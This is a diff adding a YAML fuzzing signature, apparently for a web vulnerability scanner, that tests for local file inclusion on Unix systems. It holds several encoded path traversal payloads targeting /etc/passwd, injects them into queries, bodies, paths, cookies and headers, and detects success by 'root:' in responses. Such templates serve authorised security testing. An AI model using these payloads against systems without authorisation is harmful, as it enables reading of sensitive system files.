@@ -1,0 +1,34 @@
+# info to search signature
+id: lfi-fuzz-01
+type: fuzz
+info:
+  name: LFI FUZZ *Nix
+  risk: High
+
+# origin: gonna come from Burp
+payloads:
+    - '.\\./.\\./.\\./.\\./.\\./.\\./etc/passwd'
+    - '../../../../../../../../../../../../../../../../../../../../../../etc/passwd%00'
+    - '%00../../../../../../etc/passwd'
+    - '..%252F..%252F..%252F..%252Fetc%252fpasswd'
+    - '/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00'
+    - '..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd'
+
+requests:
+  - generators:
+      # Change exist content type or adding new one
+      - Query("{{.payload}}")
+      - Body("{{.payload}}")
+      - Query("{{.payload}}", "download")
+      - Query("{{.payload}}", "include")
+      - Query("{{.payload}}", "file")
+      - Path("{{.payload}}", "*")
+      - Cookie("{{.payload}}", "file")
+      - Cookie("{{.payload}}", "report")
+      - Header("{{.payload}}", "Filename")
+      - Header("{{.payload}}", "Files")
+      - Header("{{.payload}}", "X-File-Name")
+    detections:
+      - >-
+        StringSearch("response", "root:") || StringSearch("response", "/bin/bash")
+
